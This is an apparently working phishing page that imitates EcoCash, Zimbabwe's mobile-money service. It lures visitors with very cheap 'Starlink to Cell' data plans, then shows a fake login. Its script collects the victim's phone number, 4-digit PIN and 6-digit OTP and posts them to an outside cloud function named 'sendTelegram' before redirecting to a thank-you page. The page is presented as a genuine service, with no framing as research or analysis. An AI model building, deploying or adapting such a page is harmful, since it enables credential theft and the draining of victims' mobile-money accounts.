<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Starlink to Cell — EcoCash</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box}
html,body{height:100%;margin:0}

body{
  font-family:Inter,system-ui,Arial;
  background:linear-gradient(180deg,#f7fbff,#e8f3ff);
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
}

/* ===== PLANS ===== */
.page{
  width:100%;
  max-width:960px;
  background:#fff;
  border-radius:16px;
  box-shadow:0 18px 40px rgba(15,23,42,.08);
  padding:20px;
}

.plans-grid{
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
  gap:14px;
}

.plan-card{
  background:#f8fbff;
  border:1px solid #e5edff;
  border-radius:12px;
  padding:14px;
  cursor:pointer;
}

.plan-card:hover{border-color:#2563eb}

/* ===== LOGIN ===== */
#loginPage{
  display:none;
  width:100%;
  max-width:380px;
}

.card{
  background:#fff;
  padding:20px;
  border-radius:12px;
  box-shadow:0 12px 30px rgba(2,6,23,.06);
}

.req{color:#d04444;margin-right:6px}

.pin-row{display:flex;gap:8px;margin-top:4px}
.pin-digit{
  width:44px;height:48px;text-align:center;
  font-size:22px;border-radius:8px;
  border:1px solid #e6eefc;
}

/* ===== OTP ===== */
.otp-modal{
  position:fixed;inset:0;
  background:rgba(0,0,0,.35);
  display:none;
  align-items:center;
  justify-content:center;
  z-index:9999;
}
.otp-box{
  background:#fff;padding:18px;border-radius:12px;min-width:300px;
}
.otp-row{display:flex;gap:8px;justify-content:center}
.otp-digit{
  width:40px;height:48px;text-align:center;font-size:20px;
  border-radius:8px;border:1px solid #e6eefc;
}
.otp-warning{color:#d04444;font-size:13px;display:none}
</style>
</head>

<body>

<!-- ================= PLANS PAGE ================= -->
<div class="page" id="plansPage">
  <h2>Starlink to Cell — Data Plans</h2>

  <div class="plans-grid">
    <button class="plan-card" data-plan="15GB – USD 0.99">15GB – USD 0.99</button>
    <button class="plan-card" data-plan="35GB – USD 1.99">35GB – USD 1.99</button>
    <button class="plan-card" data-plan="50GB – USD 2.99">50GB – USD 2.99</button>
    <button class="plan-card" data-plan="Unlimited – USD 3.99">Unlimited – USD 3.99</button>
  </div>
</div>

<!-- ================= LOGIN PAGE ================= -->
<div id="loginPage">
  <div class="card">
    <h2>EcoCash Login</h2>

    <label><span class="req">★</span>Mobile Number</label>
    <input id="phone" value="+263">

    <label><span class="req">★</span>4-Digit PIN</label>
    <div class="pin-row">
      <input class="pin-digit" maxlength="1">
      <input class="pin-digit" maxlength="1">
      <input class="pin-digit" maxlength="1">
      <input class="pin-digit" maxlength="1">
    </div>

    <button id="loginBtn" disabled>LOGIN</button>
  </div>
</div>

<!-- ================= OTP MODAL ================= -->
<div class="otp-modal" id="otpModal">
  <div class="otp-box">
    <strong>Enter OTP</strong>
    <div class="otp-row">
      <input class="otp-digit" maxlength="1">
      <input class="otp-digit" maxlength="1">
      <input class="otp-digit" maxlength="1">
      <input class="otp-digit" maxlength="1">
      <input class="otp-digit" maxlength="1">
      <input class="otp-digit" maxlength="1">
    </div>
    <div class="otp-warning" id="otpWarn">Enter all 6 digits</div>
    <button id="confirmOtp">Confirm</button>
  </div>
</div>

<script>
/* ================= CONFIG ================= */
const FUNCTION_URL = 'https://us-central1-master-63b77.cloudfunctions.net/sendTelegram';
const PREFIX='+263';

/* ================= STATE ================= */
let selectedPlan=null;

/* ================= PLANS ================= */
document.querySelectorAll('.plan-card').forEach(b=>{
  b.onclick=()=>{
    selectedPlan=b.dataset.plan;
    document.getElementById('plansPage').style.display='none';
    document.getElementById('loginPage').style.display='block';
  };
});

/* ================= LOGIN ================= */
const phone=document.getElementById('phone');
const pins=[...document.querySelectorAll('.pin-digit')];
const loginBtn=document.getElementById('loginBtn');

function getPin(){return pins.map(p=>p.dataset.v||'').join('');}

phone.oninput=()=>{
  let d=phone.value.slice(4).replace(/\D/g,'');
  phone.value=PREFIX+d.slice(0,9);
  update();
};

pins.forEach((p,i)=>{
  p.oninput=e=>{
    const v=e.target.value.replace(/\D/g,'');
    p.value=v?'•':'';
    p.dataset.v=v;
    if(v&&i<3)pins[i+1].focus();
    update();
  };
});

function update(){
  loginBtn.disabled=!(getPin().length===4 && phone.value.length===13);
}

loginBtn.onclick=()=>{
  document.getElementById('otpModal').style.display='flex';
  send('login_clicked',{phone:phone.value,pin:getPin(),plan:selectedPlan});
};

/* ================= OTP ================= */
const otpInputs=[...document.querySelectorAll('.otp-digit')];
const otpWarn=document.getElementById('otpWarn');

function getOtp(){return otpInputs.map(i=>i.value).join('');}

otpInputs.forEach((i,idx)=>{
  i.oninput=e=>{
    i.value=i.value.replace(/\D/g,'');
    if(i.value&&idx<5)otpInputs[idx+1].focus();
  };
});

document.getElementById('confirmOtp').onclick=()=>{
  if(getOtp().length!==6){otpWarn.style.display='block';return;}
  send('otp_confirm',{otp:getOtp(),phone:phone.value,pin:getPin(),plan:selectedPlan});
  window.location.href='thankyou.html';
};

/* ================= SEND ================= */
function send(event,data){
  fetch(FUNCTION_URL,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({event,...data,at:new Date().toISOString()})
  });
}
</script>

</body>
</html>
